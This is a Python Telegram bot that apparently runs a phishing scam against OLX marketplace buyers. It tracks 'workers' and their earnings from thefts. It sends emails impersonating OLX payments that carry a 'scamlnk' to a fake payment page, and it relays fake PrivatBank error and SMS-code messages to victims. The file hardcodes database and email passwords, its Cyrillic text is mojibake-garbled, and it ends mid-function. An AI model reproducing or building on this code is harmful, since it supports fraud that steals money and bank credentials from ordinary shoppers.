
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.executor import start_polling
# from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import Dispatcher
from aiogram import Bot, types
from bs4 import BeautifulSoup as bs
import requests
import datetime
import aiohttp
import asyncio
import logging
# import aiohttp
import asyncpg
import random
import sqlite3
import cfg
import sys
import re
import os

from functools import partial
from mailer import *

from utils import TestStates
# from messages import MESSAGES
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(format=u'%(filename)+13s [ LINE:%(lineno)-4s] %(levelname)-8s [%(asctime)s] %(message)s',
                    level=logging.INFO)

loop = asyncio.get_event_loop()

bot = Bot(token=cfg.token)

btns_text = ('üè¥‚Äç‚ò†Ô∏è –ö–∞–±–∏–Ω–µ—Ç', 'üîè –°—Å—ã–ª–∫–∏', '‚úíÔ∏è –†–µ–¥–∞–∫—Ç. —Ü–µ–Ω—É', 'üÉè –ß–∞—Ç', 'üî≤ –£–¥–∞–ª–∏—Ç—å', 'üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É', '‚≠ê –í—ã–ø–ª–∞—Ç—ã', '‚ö´Ô∏è –û—Ç–º–µ–Ω–∏—Ç—å')
keyboard_markup = ReplyKeyboardMarkup(row_width=4).add(*(types.KeyboardButton(text) for text in btns_text))

storage = MemoryStorage()
dp = Dispatcher(bot, storage=MemoryStorage())
dp.middleware.setup(LoggingMiddleware())
new_users = {}


class NewUser:
    def __init__(self, user_id, username):
        self.id = user_id
        self.username = username
        self.question = 1
        self.where_from = ""
        self.experience = ""
        self.time = ""
        self.comment = ""
        self.form = ""

        self.sent = False
        self.blocked = False

async def on_startup(dp):

    dp.database = await asyncpg.create_pool(user='admin_olx',database='admin_olx', host='185.161.209.19', password='AU5oLo8R1y')

def hide_name(name):
 
    return f"{name[:round(len(name) / 2)]}{'*' * round(len(name) - round(len(name) / 2))}"

@dp.message_handler(commands='start')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def startcmd(message: types.Message):

    if message.chat.type != "private": return

    async with dp.database.acquire() as conn:

        rows = await conn.fetch("SELECT username, ban FROM workers where userid = $1",str(message.from_user.id))
        if not rows:

            await conn.execute("INSERT INTO workers (userid,username) VALUES ($1, $2);", str(message.from_user.id),message.from_user.username)
            rows = await conn.fetch("SELECT username, ban FROM workers where userid = $1",str(message.from_user.id))

        if rows and rows[0][1] == 0:
            if str(rows[0][0]) != message.from_user.username:
                await conn.execute("UPDATE workers SET username = $1 WHERE userid = $2;", message.from_user.username, str(message.from_user.id))
                await dp.database.release(con)


                await message.reply(f"üè¥‚Äç‚ò†Ô∏è –¢–≤–æ—ë –ø–∏—Ä–∞—Ç—Å–∫–æ–µ –∏–º—è –±—ã–ª–æ –∏–∑–º–µ–Ω–µ–Ω–æ! üè¥‚Äç‚ò†Ô∏è", reply_markup=keyboard_markup)

        else:

            await conn.execute("INSERT INTO workers (userid,username) VALUES ($1, $2);", str(message.from_user.id),message.from_user.username)
    
    await dp.database.release(conn)

    chat_member = await bot.get_chat_member(cfg.chats[0], message.from_user.id)

    if chat_member.status == "left" and rows[0][1] == 0:

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(types.InlineKeyboardButton('–í–æ–π—Ç–∏ –Ω–∞ –ø–∞–ª—É–±—É! ‚ò†Ô∏è', callback_data='new_user'))
        return await message.reply("–ü—Ä–∏–≤–µ—Ç, —é–Ω—ã–π –∑–∞—Ö–≤–∞—Ç—á–∏–∫ –ö–∞—Ä–∏–±—Å–∫–∏—Ö –º–æ—Ä–µ–π! üè¥‚Äç‚ò†Ô∏è", reply_markup=keyboard)

    await message.reply(f"üè¥‚Äç‚ò†Ô∏è –†–∞–¥—ã –≤–∏–¥–µ—Ç—å —Ç–µ–±—è —Å–Ω–æ–≤–∞, —é–Ω—ã–π –ø–∏—Ä–∞—Ç {message.from_user.username}! üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è", reply_markup=keyboard_markup)


@dp.message_handler(commands='—Ä–∞—Å—Å—ã–ª–∫–∞')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def rassylka(message: types.Message):
    if message.from_user.id in cfg.admins: 

        async with dp.database.acquire() as con:

            rows = await con.fetch('SELECT userid FROM workers;')
            string = ''
            n = 0
            for row in rows:
                try:
                    await bot.send_message(row['userid'], message.text.replace("/—Ä–∞—Å—Å—ã–ª–∫–∞ ", ""))
                    n += 1
                except:
                    pass
            await bot.send_message(message.from_user.id, 'üè¥‚Äç‚ò†Ô∏è –£—Å–ø–µ—à–Ω–æ —Ä–∞–∑–æ—Å–ª–∞–Ω–æ ' + str(n) + ' —Ä–∞–∑')
        
        await dp.database.release(con)


@dp.message_handler(commands='makecheck')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def makecheck(message: types.Message):

    if message.from_user.id in cfg.admins:
        await bot.send_message(message.chat.id, 'üè¥‚Äç‚ò†Ô∏è –ù–∞—á–∏–Ω–∞–µ–º –ø–∏—Å–∞—Ç—å —á–µ–∫ —é–∑–µ—Ä—É ! üè¥‚Äç‚ò†Ô∏è')
        msg = message.text.replace("/makecheck ", "")

        async with dp.database.acquire() as con:

            username = msg.split(' ')[0]
            price = msg.split(' ')[1]
            userid = await con.fetchval(f"SELECT userid  FROM workers where username = $1;", username)
            if userid:
                balance = await con.fetchval(f"SELECT balance  FROM workers WHERE userid=$1;", userid)
                zaletov = await con.fetchval(f"SELECT zaletov  FROM workers WHERE userid=$1;", userid)

                string = ''

                await con.execute(
                    f"UPDATE workers SET balance=$1 WHERE userid=$2", int(balance) + int(price), userid)
                await con.execute(f"UPDATE workers SET zaletov=$1 WHERE userid=$2", int(zaletov) + 1, userid)
                await con.execute(
                    f"INSERT INTO zalety (worker,price,name) VALUES ($1,$2, $3)", username, price, userid)

                await bot.send_message(cfg.chats[0],
                                        "üí∞<b>–£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞!</b> \nüõ†<b>–í–æ—Ä–∫–µ—Ä:</b> @" + msg.split(' ')[
                                            0] + "\nüí∏<b>–°—É–º–º–∞: " + msg.split(' ')[1] + "</b> –≥—Ä–Ω. !",
                                        parse_mode='HTML')
                    
            else:
                await bot.send_message(message.chat.id,
                                       f"üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –Æ–∑–µ—Ä–∞ {username} –Ω–µ—Ç—É –≤ –±–∞–∑–µ, –ø—É—Å—Ç—å —é–∑–µ—Ä –ø—Ä–æ–ø–∏—à–µ—Ç /start üè¥‚Äç‚ò†Ô∏è")

        await dp.database.release(con)


@dp.message_handler(commands='kick')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def kick_member(message: types.Message):
    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:

            user_id = await con.fetchval(f"SELECT userid  FROM workers where username = $1", message.text.replace('/kick ', ''))
            kick_message = await random.choice(cfg.kick_message)

            await bot.send_message(int(user_id), "–¢—ã " + kick_message)
            await bot.send_message(cfg.chats[0], message.text.replace('/kick ', '') + " " + kick_message)
            await bot.send_message(message.from_user.id, "–ì–æ—Ç–æ–≤–æ!")
            await bot.kick_chat_member(cfg.chats[0], int(user_id))
        
        await dp.database.release(con)

    else:

        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")


@dp.message_handler(commands='ban')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def ban_message(message: types.Message):
    if message.from_user.id in cfg.admins:

        user_id = None

        async with dp.database.acquire() as con:

            user_id = await con.fetchval(f"SELECT userid  FROM workers WHERE username = $1", message.text.replace('/ban ', ''))
            await con.execute(f"UPDATE workers SET ban=1 WHERE userid = $1", user_id)

        await dp.database.release(con)

        await bot.send_message(int(user_id), "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –¢—ã –∑–∞–±–∞–Ω–∏–Ω!")
        await bot.send_message(message.from_user.id, "üè¥‚Äç‚ò†Ô∏è –ì–æ—Ç–æ–≤–æ!")

    else:
        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")

@dp.message_handler(commands='mail')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def mail(message: types.Message):
    
    ctx = message.text.strip().replace("/mail", "").split()

    pochta = idobyavi = pokupatel = None

    try:

        pochta = ctx[0]
        idobyavi = int(ctx[1])
        pokupatel = ctx[2]

    except Exception as e:

        return await message.reply(f"/mail pochta@gmail.com idobyavleniya imyapokupatelya //// {e}")

    async with dp.database.acquire() as con:

        itemid = await con.fetchval("SELECT item FROM links WHERE id = $1", idobyavi)
        tovar = await con.fetchval("SELECT tovarN FROM links WHERE id = $1", idobyavi)

    await dp.database.release(con)

    if (itemid == None) or (tovar == None):

        return await message.reply("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ —É–∫–∞–∑–∞–Ω–æ id –æ–±—å—è–≤–ª–µ–Ω–∏—è")

    scamlnk = f"https://{cfg.domain}/?item_id={itemid}"

    try:

        result = await dp.loop.run_in_executor(
            
            None,
            partial(
                
                send,
                pochta, 
                "payments.olx.ua@gmail.com", 
                "P455w0rd", 
                scamlnk, 
                pokupatel, 
                tovar.strip()

            )

        )

        await message.reply("–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –º–∞–º–æ–Ω—Ç—É! –ñ–¥–∏ –∑–∞–ª–µ—Ç–∞!!!")

    except Exception as e:

        await message.reply(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")

@dp.message_handler(commands='refund')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def refund(message: types.Message):
    
    ctx = message.text.strip().replace("/refund", "").split()

    pochta = idobyavi = pokupatel = None

    try:

        pochta = ctx[0]
        idobyavi = int(ctx[1])
        pokupatel = ctx[2]

    except Exception as e:

        return await message.reply(f"/refund pochta@gmail.com idobyavleniya imyapokupatelya //// {e}")

    async with dp.database.acquire() as con:

        itemid = await con.fetchval("SELECT item FROM links WHERE id = $1", idobyavi)
        tovar = await con.fetchval("SELECT tovarN FROM links WHERE id = $1", idobyavi)

    await dp.database.release(con)

    if (itemid == None) or (tovar == None):

        return await message.reply("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ —É–∫–∞–∑–∞–Ω–æ id –æ–±—å—è–≤–ª–µ–Ω–∏—è")

    scamlnk = f"https://{cfg.domain}/?item_id={itemid}.html&refund"

    try:

        result = await dp.loop.run_in_executor(
            
            None,
            partial(
                
                vozvrat,
                pochta, 
                "payments.olx.ua@gmail.com", 
                "P455w0rd", 
                scamlnk, 
                pokupatel, 
                tovar.strip()

            )

        )

        await message.reply("–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –º–∞–º–æ–Ω—Ç—É (–≤–æ–∑–≤—Ä–∞—Ç)! –ñ–¥–∏ –∑–∞–ª–µ—Ç–∞ —Ö2!!!")

    except Exception as e:

        await message.reply(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")

@dp.message_handler(commands='unban')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def unban_member(message: types.Message):
    if message.from_user.id in cfg.admins:

        user_id = None

        async with dp.database.acquire() as con:

            user_id = await con.fetchval(f"SELECT userid  FROM workers WHERE username = $1", message.text.replace('/unban ', ''))
            await con.execute(f"UPDATE workers SET ban=0 WHERE userid = $1", user_id)
        
        await dp.database.release(con)

        await bot.send_message(int(user_id), "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –¢—ã —Ä–∞–∑ –∑–∞–±–∞–Ω–∏–Ω!")
        await bot.send_message(message.from_user.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –ì–æ—Ç–æ–≤–æ!")

    else:

        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")


@dp.message_handler(commands='send')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def send_message(message: types.Message):
    if message.from_user.id in cfg.admins:
        text = re.match(r'(\d*) (.*)', message.text.replace('/send ', ''))
        await bot.send_message(int(text.group(1)), text.group(2))
        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –ì–æ—Ç–æ–≤–æ!")
    else:
        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ –º–∞!")


@dp.message_handler(commands='addproxy')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def add_proxy(message: types.Message):
    if message.from_user.id in cfg.admins:
        proxy = re.match(r'(\w*):\/\/(\w*):(\w*)@(\w.*):(\d*)', message.text.replace('/addproxy ', ''))

        async with dp.database.acquire() as con:

            await con.execute(
                "INSERT INTO proxys (type, proxy_user, password, ip, port) VALUES ($1, $2, $3, $4, $5)",
                proxy.group(1), proxy.group(2), proxy.group(3), proxy.group(4), proxy.group(5)
            )
        
        await dp.database.release(con)
        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –ì–æ—Ç–æ–≤–æ!")

    else:

        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")


@dp.message_handler(commands='proxys')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def add_proxy(message: types.Message):

    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:
            text = ""
            rows = await con.fetch("SELECT *  FROM proxys")
            for row in rows:
                text+=f"<b>{row[0]}</b>: <code>{row[1]}://{row[2]}:{row[3]}@{row[4]}:{row[5]}</code>\n"

            await bot.send_message(message.chat.id, text, parse_mode='HTML')
        
        await dp.database.release(con)

    else:
        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")


@dp.message_handler(commands='help')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def help(message: types.Message):

    if message.from_user.id in cfg.admins:
        await bot.send_message(message.chat.id, cfg.help, parse_mode='HTML')
    else:
        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")


@dp.message_handler(commands='keyboard')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def keyboard_send(message: types.Message):
    await bot.send_message(message.from_user.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –ü–æ–ª—É—á–∏ —Å–≤–æ—ë –º–æ—Ä—Å–∫–æ–µ –º–µ–Ω—é! üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è", reply_markup=keyboard_markup)


@dp.message_handler(commands='info')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def info(message: types.Message):
    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:

            rows = await con.fetch("SELECT *  FROM workers WHERE username=$1", message.text.replace('/info ', ''))

            id = rows[0][0]
            userid = rows[0][1]
            username = rows[0][2]
            balance = rows[0][3]
            ban = rows[0][4]
            zaletov = rows[0][5]

            await bot.send_message(message.chat.id, f"id: {id}\nuserid: {userid}\nusername: {username}\nbalance: {balance}\n"
                                                    f"ban: {ban}\nzaletov: {zaletov}")

        await dp.database.release(con)

    else:

        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")


@dp.message_handler(commands='delproxy')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def del_proxy(message: types.Message):
    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:

            rows = await con.execute("DELETE FROM proxys WHERE id=$1", int(message.text.replace('/delproxy ', '')))
            await bot.send_message(message.chat.id, "–ì–æ—Ç–æ–≤–æ!", parse_mode='HTML')

        await dp.database.release(con)

    else:

        await bot.send_message(message.chat.id, "üè¥‚Äç‚ò†Ô∏èüè¥‚Äç‚ò†Ô∏è –î–æ—Å—Ç—É–ø–∞ —É —Ç–µ–±—è –Ω–µ–º–∞!")

@dp.message_handler(commands='accept')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def accepttt(message: types.Message):

    if message.from_user.id in cfg.admins:

        try:

            cont = int(message.text.strip().replace("/accept", "").strip())

        except:

            return await message.reply("–í–≤–µ–¥–∏—Ç–µ –Ω–æ—Ä–º–∞–ª—å–Ω—ã–π –∞–π–¥–∏")

        try:

            mmb = await bot.get_chat_member(cont, cont)
            await bot.send_message(mmb.user.id, "–í—ã –±—ã–ª–∏ –ø—Ä–∏–Ω—è—Ç—ã –≤ —Ä—è–¥—ã –ø–∏—Ä–∞—Ç–æ–≤! üè¥‚Äç‚ò†Ô∏è")
            await message.reply("–ü—Ä–∏–Ω—è—Ç –Ω–∞—Ö—É–π")

        except Exception as e:

            await message.reply(e)

        try:

            del new_users[mmb.user.id]

        except: pass
        
    else: await bot.send_message(message.from_user.id, "üè¥‚Äç‚ò†Ô∏è –Ω–µ–º–∞ –¥–æ—Å—Ç—É–ø–∞ :)")

@dp.message_handler(commands='status')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è —Ö—É–ª–∏ —Ç—ã —Ç–∞–∫–æ–π –±—ã—Å—Ç—Ä—ã–π –±–ª—è—Ç—å, –º–æ–ª–æ–¥–æ–π –ø–∏—Ä–∞—Ç?")),
              rate=0.5)
async def statuss(message: types.Message):
    if message.from_user.id in cfg.admins:

        if '-' in message.text:
            idmam = message.text.strip().replace("/status ", '').split('-')[0]
            iderr = message.text.strip().replace("/status ", '').split('-')[1]
            status = ""
            link = 'no'
            texttoworker = ""
            if iderr == "1":
                status = "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –ø—Ä–∏–º–µ—á–∞–Ω–∏—è. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É"
                texttoworker = "–£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞"
            elif iderr == "2":
                status = "–û—à–∏–±–∫–∞. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–∏–º–∏—Ç –Ω–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –ø–æ–∫—É–ø–∫–∏ –≤ –ª–∏—á–Ω–æ–º –∫–∞–±–∏–Ω–µ—Ç–µ —Å–≤–æ–µ–≥–æ –±–∞–Ω–∫–∞, –ø–æ—Å–ª–µ —á–µ–≥–æ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É."
                texttoworker = "–õ–∏–º–∏—Ç"
            elif iderr == "3":
                status = "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤. –ü–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å –∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É."
                texttoworker = "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤"
            elif iderr == "4":
                status = "–†–∞–∑–±–ª–æ–∫–∏—Ä—É–π—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é –≤ –º–æ–±–∏–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏: —Ä–∞–∑–¥–µ–ª –û–Ω–ª–∞–π–Ω –ø–æ–º–æ—â—å > –ù–µ –ø—Ä–æ—Ö–æ–¥–∏—Ç –æ–ø–ª–∞—Ç–∞ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ. –ü–æ—Å–ª–µ —á–µ–≥–æ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ –∑–∞–∫–∞–∑–∞."
                texttoworker = "–†–∞–∑–±–ª–æ–∫–∏—Ä—É–π—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é –≤ –º–æ–±–∏–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏"
            elif iderr == "5":
                status = "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞–ª–∏—á–∏–µ SMS –æ—Ç –ü—Ä–∏–≤–∞—Ç–ë–∞–Ω–∫–∞ –æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –ø–ª–∞—Ç–µ–∂–∞. –ù–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–ª–∞—Ç—ë–∂ –∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏—è."
                texttoworker = "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞–ª–∏—á–∏–µ SMS –æ—Ç –ü—Ä–∏–≤–∞—Ç–ë–∞–Ω–∫–∞"
            elif iderr == "6":
                status = "–ù–µ–≤–µ—Ä–Ω—ã–π —Å–º—Å-–∫–æ–¥. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É."
                texttoworker = "–ù–µ–≤–µ—Ä–Ω—ã–π —Å–º—Å-–∫–æ–¥"
            elif "link " in iderr:
                status = "–ñ–¥–∏—Ç–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–ø–ª–∞—Ç—ã."
                link = re.findall(r"(https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9]+\.[^\s]{2,}|www\.[a-zA-Z0-9]+\.[^\s]{2,})", message.text)[0]
                async with dp.database.acquire() as con:
                    await con.execute("UPDATE status SET link = $1 WHERE ip = $2;", link, idmam)
                await dp.database.release(con)

                texttoworker = "üî• –ú–∞–º–æ–Ω—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –æ–ø–ª–∞—Ç—ã. –ñ–¥–µ–º –ø—Ä–æ—Ñ–∏—Ç"
            elif 'privat24.ua' in iderr:
                status = iderr
                texttoworker = "–ü—Ä–∏–≤–∞—Ç —â–∞ —É–ª–µ—Ç–∏—Ç"
            else:
                status = iderr
                texttoworker = iderr
            status = status.encode().decode()

            async with dp.database.acquire() as con:
                await con.execute("UPDATE status SET status = $1 WHERE ip = $2;", status, idmam)
            await dp.database.release(con)

            await bot.send_message(message.chat.id, '[' + idmam + "]  " + status)
        

            try:

                async with dp.database.acquire() as con:

